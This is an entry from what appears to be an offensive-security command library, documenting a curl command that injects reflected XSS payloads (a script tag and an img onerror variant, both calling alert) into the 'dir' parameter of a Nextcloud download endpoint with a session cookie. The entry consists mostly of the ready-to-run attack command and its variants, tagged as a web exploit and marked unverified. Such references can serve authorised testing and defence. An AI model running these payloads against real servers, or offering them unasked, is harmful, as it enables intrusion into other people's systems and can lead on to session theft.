---
id: cmd-curl-xss-payload
data: >-
  curl -X GET
  "https://nextcloud.example.com/index.php/apps/files/ajax/download.php?files=%00&dir=/invalid</p><script>alert('XSS')</script>"
  -b "cookie=logged_in_session"
tags:
  - xss
  - web-exploit
  - nextcloud
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:25.021Z'
verified: false
validated: true
submitted: true
---
# curl-nextcloud-xss-payload

## Command

```bash
curl -X GET "https://nextcloud.example.com/index.php/apps/files/ajax/download.php?files=%00&dir=/invalid</p><script>alert('XSS')</script>" -b "cookie=logged_in_session"
```

## Description

This command injects an HTML payload into the Nextcloud file download endpoint to exploit reflected XSS on error pages.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `URL` | Endpoint with payload in `dir` parameter | Yes |
| `-b "cookie=..."` | Authentication cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://nextcloud.example.com/index.php/apps/files/ajax/download.php?files=%00&dir=/invalid</p><script>alert('XSS')</script>" -b "cookie=logged_in_session"
```

### Advanced Usage

```bash
curl -s -X GET "https://nextcloud.example.com/index.php/apps/files/ajax/download.php?files=%00&dir=/invalid</p><img src=x onerror=alert('XSS')>" -b "cookie=logged_in_session" -o xss_response.html
```

## Expected Output

Error page HTML with unescaped injected script tag, visible in source; execution may be blocked by CSP.

## Related

- [[commands/curl-nextcloud-download-test]]
- [[procedures/Exploit-HTML-Injection-for-Reflected-XSS-in-Nextcloud]]
